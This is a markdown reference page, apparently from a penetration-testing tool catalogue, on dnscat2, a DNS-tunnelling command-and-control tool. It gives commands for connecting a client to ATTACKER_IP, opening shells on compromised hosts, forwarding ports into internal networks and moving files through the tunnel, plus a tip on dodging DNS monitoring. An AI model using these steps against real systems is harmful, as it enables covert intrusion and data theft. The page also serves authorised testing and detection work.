---
title: "dnscat2 - DNS Tunnel for Encrypted C2"
description: "DNS-based command and control channel with encryption, tunneling, and multi-session management"
category: "tunneling"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
github: "https://github.com/iagox86/dnscat2"
kali_install: "git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/client && make"
---

# dnscat2

## Overview

dnscat2 creates encrypted command-and-control channels over the DNS protocol. Unlike other DNS tunneling tools, dnscat2 is purpose-built for C2 operations, supporting file uploads/downloads, shell sessions, port forwarding, and encrypted communications. It traverses the DNS hierarchy, bypassing firewalls that permit only DNS resolution.

## Chapter 1: Installation

### Client (C)

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
```

### Server (Ruby)

```bash
cd dnscat2/server
gem install bundler
bundle install
```

### Dependencies

```bash
# Client build dependencies
sudo apt install build-essential

# Server dependencies
sudo apt install ruby ruby-dev
```

## Chapter 2: Basic Usage

### Start Server

```bash
ruby dnscat2.rb example.com
```

**Explanation**: Starts the dnscat2 server listening for connections for the domain `example.com`. The server must run on an authoritative DNS server for the specified domain.

### Start Client

```bash
./dnscat2 example.com
```

**Explanation**: The client connects to the dnscat2 server through the DNS hierarchy. All traffic is routed through DNS queries to the specified domain.

### Direct Connection

```bash
# Server
ruby dnscat2.rb --dns server=0.0.0.0,port=5353

# Client
./dnscat2 --dns server=ATTACKER_IP,port=5353
```

**Explanation**: Direct connection mode bypasses the DNS hierarchy and connects directly to the server via UDP. This is faster but more visible in network traffic.

## Chapter 3: Session Management

### List Sessions

```
dnscat2> windows
```

**Explanation**: Displays all active sessions including DNS listeners, command sessions, and shell sessions. Sessions are numbered and labeled with their type.

### Switch Session

```
dnscat2> session -i 1
```

**Explanation**: Interacts with session 1, providing access to commands or the shell. The prompt changes to indicate the active session.

### Background Session

```
dnscat2> ctrl-z
```

**Explanation**: Returns to the main dnscat2 prompt while keeping the current session active. Multiple sessions can be managed simultaneously.

## Chapter 4: Shell Sessions

### Create Shell

```
dnscat2> session -i 1
command session (target) 1> shell
```

**Explanation**: Creates a shell session on the target system. The shell is interactive and can execute commands on the compromised host.

### Execute Command

```
dnscat2> session -i 1
command session (target) 1> exec cmd.exe
```

**Explanation**: Executes a specific command on the target. The output is returned through the DNS tunnel.

## Chapter 5: Port Forwarding

### Listen on Server

```
dnscat2> session -i 1
command session (target) 1> listen 4444 internal_host:80
```

**Explanation**: The server listens on port 4444 and forwards connections through the DNS tunnel to `internal_host:80` on the target's network. This provides access to internal services.

### SSH Through Tunnel

```
command session (target) 1> listen 2222 127.0.0.1:22
```

**Explanation**: Forwards SSH connections through the DNS tunnel. The attacker connects to `localhost:2222`, and traffic is tunneled through DNS to the target's SSH service.

## Chapter 6: Encryption

### Pre-Shared Key

```bash
ruby dnscat2.rb --secret mysecretkey example.com
./dnscat2 --secret mysecretkey example.com
```

**Explanation**: Both sides use the same pre-shared key for encryption. This provides authentication and encryption, preventing man-in-the-middle attacks.

### Auto-Generated Encryption

```bash
ruby dnscat2.rb example.com
./dnscat2 example.com
```

**Explanation**: By default, dnscat2 uses ECDH key exchange with Salsa20 encryption and SHA3 signatures. No pre-shared key is required, but man-in-the-middle attacks are possible.

### Short Authentication String

```
dnscat2> New session established! The shared secret is: horse battery staple
```

**Explanation**: Both client and server display a short authentication string. If the strings match, the connection is authenticated. This prevents man-in-the-middle attacks without pre-shared keys.

## Chapter 7: File Operations

### Upload File

```
command session (target) 1> upload /local/file.txt /remote/file.txt
```

**Explanation**: Transfers a file from the attacker to the target through the DNS tunnel. The file is encoded in DNS queries and decoded on the target.

### Download File

```
command session (target) 1> download /remote/file.txt /local/file.txt
```

**Explanation**: Retrieves a file from the target to the attacker's machine through the DNS tunnel.

## Chapter 8: Security and Evasion

### Security Modes

```
dnscat2> set security=authenticated    # Require pre-shared key
dnscat2> set security=open            # Allow unencrypted
```

**Explanation**: The security mode controls encryption requirements. `authenticated` requires a pre-shared key, `encrypted` (default) uses auto-negotiated encryption, and `open` disables encryption.

### DNS Traffic Characteristics

dnscat2 traffic appears as:
- TXT record queries with high entropy
- Large DNS responses
- Frequent queries to the same domain

**Explanation**: These characteristics can be detected by DNS monitoring tools. Using domain generation algorithms and varying query patterns can reduce detection risk.

### DNS Server Configuration

```
# In BIND named.conf
zone "example.com" {
    type master;
    file "example.com.zone";
    allow-query { any; };
};
```

**Explanation**: Configure an authoritative DNS server to handle queries for your tunnel domain. The server must respond to TXT, NULL, and MX queries with the encoded data.

## Resources

- [dnscat2 GitHub Repository](https://github.com/iagox86/dnscat2)
- [dnscat2 Protocol Documentation](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md)
- [DNS Tunneling Techniques](https://en.wikipedia.org/wiki/DNS_tunneling)
